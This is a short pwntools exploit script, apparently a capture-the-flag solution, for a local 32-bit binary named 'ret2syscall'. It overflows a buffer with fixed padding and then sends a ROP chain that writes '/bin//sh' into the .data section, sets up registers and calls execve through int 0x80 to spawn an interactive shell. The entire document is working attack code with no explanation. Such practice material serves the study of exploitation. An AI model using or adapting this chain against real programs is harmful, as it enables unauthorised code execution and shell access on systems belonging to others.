from pwn import *

p = process("./ret2syscall")
#gdb.attach(p,"b *0x080488ED")

def ropchain():
	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806f1da) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080b8526) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x08054b6b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f1da) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080b8526) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x08054b6b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f1da) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049493) # xor eax, eax ; ret
	p += pack('<I', 0x08054b6b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080ded31) # pop ecx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x0806f1da) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049493) # xor eax, eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0807abbf) # inc eax ; ret
	p += pack('<I', 0x0806ce55) # int 0x80
	return p

p.recvuntil("ret2syscall\n")
payload = "a" * 0x108 + "junk"
payload += ropchain()
p.sendline(payload)
p.interactive()
